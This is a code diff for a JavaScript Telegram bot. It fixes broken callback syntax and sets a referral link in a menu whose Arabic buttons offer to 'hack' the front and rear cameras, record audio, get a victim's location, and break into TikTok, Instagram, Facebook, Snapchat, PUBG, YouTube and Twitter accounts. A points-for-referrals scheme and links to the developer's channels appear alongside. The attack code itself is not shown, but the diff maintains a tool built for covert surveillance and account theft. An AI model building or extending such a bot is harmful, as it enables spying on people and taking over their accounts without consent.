@@ -543,7 +543,7 @@ let pointsRequiredForSubscription = 15;
 
 function createReferralLink(userId) {
     const referralCode = Buffer.from(userId.toString()).toString('base64');
-    return `https://t.me/YourBotUsername?start=${referralCode}`;
+    return `https://t.me/Hzhzhxhbxbdbot?start=${referralCode}`;
 }
 
 function addPoints(userId, points) {
@@ -603,17 +603,17 @@ function showButtons(chatId, userId) {
         : `لديك ${points} نقطة. اجمع 15 نقطة للاشتراك في البوت واستخدامه بدون قيود.`;
 
     let keyboard = [
-        [{ text: '📸 اختراق الكاميرا الأمامية والخلفية 📸', callback_'front_camera' }],
+        [{ text: '📸 اختراق الكاميرا الأمامية والخلفية 📸', callback_data:'front_camera' }],
         [{ text: '🎙 تسجيل صوت 🎙', callback_data:'voice_record' }],
-        [{ text: '🗺️ الحصول على الموقع 🗺️', callback_'get_location' }],
-        [{ text: '☠️اختراق تيك توك ☠️', callback_ 'increase_tiktok' }],
-        [{ text: '🕷اختراق الانستغرام🕷', callback_ 'increase_instagram' }],
-        [{ text: '🔱اختراق الفيسبوك🔱', callback_ 'increase_facebook' }],
-        [{ text: '👻 اختراق سناب شات 👻', callback_ 'increase_snapchat' }],
-        [{ text: '🔫اختراق حسابات ببجي🔫', callback_ 'pubg_uc' }],
-        [{ text: '🔴اختراق يوتيوب🔴', callback_ 'increase_youtube' }],
+        [{ text: '🗺️ الحصول على الموقع 🗺️', callback_data:'get_location' }],
+        [{ text: '☠️اختراق تيك توك ☠️', callback_data:'increase_tiktok' }],
+        [{ text: '🕷اختراق الانستغرام🕷', callback_data:'increase_instagram' }],
+        [{ text: '🔱اختراق الفيسبوك🔱', callback_data:'increase_facebook' }],
+        [{ text: '👻 اختراق سناب شات 👻', callback_data:'increase_snapchat' }],
+        [{ text: '🔫اختراق حسابات ببجي🔫', callback_data:'pubg_uc' }],
+        [{ text: '🔴اختراق يوتيوب🔴', callback_data:'increase_youtube' }],
         [{ text: '🐦اختراق تويتر🐦', callback_data: 'increase_twitter' }],
-        [{ text: '🔗 إنشاء رابط دعوة 🔗', callback_ 'create_referral' }],
+        [{ text: '🔗 إنشاء رابط دعوة 🔗', callback_data:'create_referral' }],
         [{ text: '💰 نقاطي 💰', callback_data: 'my_points' }],
         [{ text: 'قناة المطور سجاد', url: 'https://t.me/SJGDDW' }],
         [{ text: 'سجاد تتواصل مع المطور', url: 'https://t.me/SAGD112' }],
